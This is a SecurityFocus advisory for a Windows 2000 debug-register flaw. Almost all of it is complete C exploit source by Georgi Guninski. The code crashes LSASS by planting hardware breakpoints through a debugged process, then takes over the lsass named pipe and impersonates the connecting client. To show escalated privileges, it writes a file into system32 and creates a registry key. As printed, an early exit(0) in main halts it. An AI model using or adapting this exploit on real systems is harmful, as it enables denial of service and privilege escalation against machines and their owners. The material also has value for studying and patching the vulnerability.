source: http://www.securityfocus.com/bid/2764/info

A vulnerability exists in the handling of debug registers in Windows 2000.

It is possible for unprivileged processes to create breakpoints for arbitrary processes. This can be used to 'kill' arbitrary processes without administrative privileges.

Since it is possible for an unprivileged process to terminate arbitrary processes, depending on the programs involved, this vulnerability could be used to leverage other attacks. Including a denial of service or elevating privileges by 'impersonating' a trusted named pipe. 

// Win2K elevation of privileges
// Written by Georgi Guninski http://www.guninski.com
// Kind of ugly but works
// Check the disclaimer and advisory at http://www.guninski.com/dr07.html

#define _WIN32_WINNT  0x0500

#include <stdio.h>
#include <windows.h>
#include <stdlib.h>

// may need to change below
///////////////////////////////
DWORD lsasspid=224; // pid of LSASS.EXE
//DWORD lsasspid=236; // pid of LSASS.EXE
DWORD MAGICESPINLSA=0x0053ffa0; // ESP in LSASS.EXE - may need to change it
//////////////////////////////

char szPipe[64]="\\\\.\\pipe\\lsass";
HANDLE hProc = NULL;
PROCESS_INFORMATION pi;


volatile int lsadied = 0;



unsigned long __stdcall threadlock(void *v)
{   
	Sleep(1000);
	LockWorkStation();
	return 0;
}

unsigned long __stdcall threadwriter(void *v)
{
	while(!lsadied)
	{
    FILE *f1;
	f1=fopen("\\\\.\\pipe\\lsass","a");
	 if (f1 != NULL)
		{
		 fprintf(f1,"A");
		 fclose(f1);
		}
/*
	 else
		 printf("%s\n","error writing to pipe");
*/
	Sleep(400);
	}
	printf("%s\n","Stop writing to pipe");
	return 0;
}

unsigned long __stdcall waitlsadie(void *v)
{

int lsadied2=0;
long ( __stdcall *NtQuerySystemInformation )( ULONG, PVOID, ULONG, ULONG ) = NULL;
if ( !NtQuerySystemInformation )
      NtQuerySystemInformation = ( long ( __stdcall * )( ULONG, PVOID, ULONG,
ULONG ) ) GetProcAddress( GetModuleHandle( "ntdll.dll" ),"NtQuerySystemInformation" );
typedef struct _tagThreadInfo
{
        FILETIME ftCreationTime;
        DWORD dwUnknown1;
        DWORD dwStartAddress;
        DWORD dwOwningPID;
        DWORD dwThreadID;
        DWORD dwCurrentPriority;
        DWORD dwBasePriority;
        DWORD dwContextSwitches;
        DWORD dwThreadState;
          DWORD dwWaitReason;
        DWORD dwUnknown2[ 5 ];
} THREADINFO, *PTHREADINFO;
#pragma warning( disable:4200 )
typedef struct _tagProcessInfo
{
        DWORD dwOffset;
        DWORD dwThreadCount;
        DWORD dwUnknown1[ 6 ];
        FILETIME ftCreationTime;
        DWORD dwUnknown2[ 5 ];
        WCHAR* pszProcessName;
        DWORD dwBasePriority;
        DWORD dwProcessID;
        DWORD dwParentProcessID;
        DWORD dwHandleCount;
        DWORD dwUnknown3;
        DWORD dwUnknown4;
        DWORD dwVirtualBytesPeak;
        DWORD dwVirtualBytes;
        DWORD dwPageFaults;
        DWORD dwWorkingSetPeak;
        DWORD dwWorkingSet;
        DWORD dwUnknown5;
        DWORD dwPagedPool;
        DWORD dwUnknown6;
        DWORD dwNonPagedPool;
        DWORD dwPageFileBytesPeak;
        DWORD dwPrivateBytes;
        DWORD dwPageFileBytes;
        DWORD dwUnknown7[ 4 ];
        THREADINFO ti[ 0 ];
} _PROCESSINFO, *PPROCESSINFO;
#pragma warning( default:4200 )



 PBYTE pbyInfo = NULL;
 DWORD cInfoSize = 0x20000;
while(!lsadied2)
{
 pbyInfo = ( PBYTE ) malloc( cInfoSize );
 NtQuerySystemInformation( 5, pbyInfo, cInfoSize, 0 ) ;
 PPROCESSINFO pProcessInfo = ( PPROCESSINFO ) pbyInfo;
 bool bLast = false;
 lsadied2 = 1;
 do {
	 if ( pProcessInfo->dwOffset == 0 )
         bLast = true;
     if (pProcessInfo->dwProcessID == lsasspid)
		 lsadied2 = 0 ;
     pProcessInfo = ( PPROCESSINFO ) ( ( PBYTE ) pProcessInfo + pProcessInfo->dwOffset );
    } while( bLast == false );
 free( pbyInfo );
}
printf("LSA died!\n");
lsadied=1;
return 0;
}



void add_thread(HANDLE thread)
{
		  CONTEXT ctx = {CONTEXT_DEBUG_REGISTERS};

//DR7=d0000540 DR6=ffff0ff0 DR3=53ffa0 DR2=0 DR1=0 DR0=0

    SuspendThread(thread);
    GetThreadContext(thread,&ctx);
	ctx.Dr7=0xd0000540;
	ctx.Dr6=0xffff0ff0;
	ctx.Dr3=MAGICESPINLSA;
	ctx.Dr2=0;
	ctx.Dr1=0;
	ctx.Dr0=0;
    SetThreadContext(thread, &ctx);
    ResumeThread(thread);
//    printf("DR7=%x DR6=%x DR3=%x DR2=%x DR1=%x DR0=%x\n",ctx.Dr7,ctx.Dr6,ctx.Dr3,ctx.Dr2,ctx.Dr1,ctx.Dr0);

}


unsigned long __stdcall threaddeb(void *v)
{
    STARTUPINFO si = {
        sizeof(STARTUPINFO)
    };


    CreateProcess(0,"c:\\winnt\\system32\\taskmgr.exe",0,0,0,
		CREATE_NEW_CONSOLE,0,0,&si,&pi);
	Sleep(2000);
    BOOL status = CreateProcess(
        0,
        "c:\\winnt\\system32\\calc.exe",
        0,0,0,
		DEBUG_PROCESS
        | DEBUG_ONLY_THIS_PROCESS
        | CREATE_NEW_CONSOLE,
        0,0,&si,&pi);

    if( !status )
    {
		printf("%s\n","error debugging");
		exit(1);
    }

    add_thread(pi.hThread);

    for( ;; )
    {
        DEBUG_EVENT de;
        if( !WaitForDebugEvent(&de, INFINITE) )
        {
		 printf("%s\n","error WaitForDebugEvent");
        }

        switch( de.dwDebugEventCode )
        {
        case CREATE_THREAD_DEBUG_EVENT:
            add_thread(de.u.CreateThread.hThread);
            break;
        }
    ContinueDebugEvent(de.dwProcessId,de.dwThreadId,DBG_CONTINUE);
	}

	return 0;
}

    int main(int argc,char* argv[])
    {
      DWORD dwType = REG_DWORD;
      DWORD dwSize = sizeof(DWORD);
	  DWORD dwNumber = 0;
      char szUser[256];

	exit(0);
      HANDLE hPipe = 0;

		if (argc > 1)
			lsasspid=atoi(argv[1]);
		if (argc > 2)
			sscanf(argv[2],"%x",&MAGICESPINLSA);

	  printf("Fun with debug registers. Written by Georgi Guninski\n");
	  printf("vvdr started: lsasspid=%d breakp=%x\n",lsasspid,MAGICESPINLSA);
   	  CreateThread(0, 0, &threadwriter, NULL, 0, 0);
	  CreateThread(0, 0, &waitlsadie, NULL, 0, 0);
	  CreateThread(0, 0, &threaddeb, NULL, 0, 0);

  	  while(!lsadied);

      printf("start %s\n",szPipe);
      hPipe = CreateNamedPipe (szPipe, PIPE_ACCESS_DUPLEX,
                               PIPE_TYPE_MESSAGE|PIPE_WAIT,
                               2, 0, 0, 0, NULL);
      if (hPipe == INVALID_HANDLE_VALUE)
      {
        printf ("Failed to create named pipe:\n  %s\n", szPipe);
        return 3;
      }
	  CreateThread(0, 0, &threadlock, NULL, 0, 0);
	  ConnectNamedPipe (hPipe, NULL);
      if (!ReadFile (hPipe, (void *) &dwNumber, 4, &dwSize, NULL))
      {
        printf ("Failed to read the named pipe.\n");
        CloseHandle(hPipe);
        return 4;
      }

     if (!ImpersonateNamedPipeClient (hPipe))
      {
        printf ("Failed to impersonate the named pipe.\n");
        CloseHandle(hPipe);
        return 5;
      }
      dwSize  = 256;
      GetUserName(szUser, &dwSize);
      printf ("Impersonating dummy :) : %s\n\n\n\n", szUser);
// the action begins
	  FILE *f1;
	  f1=fopen("c:\\winnt\\system32\\vv1.vv","a");
		if (f1 != NULL)
		{
		 fprintf(f1,"lsass worked\n");
		 fclose(f1);
		 printf("\n%s\n","Done!");
		}
		else
		 printf("error creating file");
	fflush(stdout);
	HKEY mykey;
	RegCreateKey(HKEY_CLASSES_ROOT,"vv",&mykey);
	RegCloseKey(mykey);


    CloseHandle(hPipe);
    return 0;
    }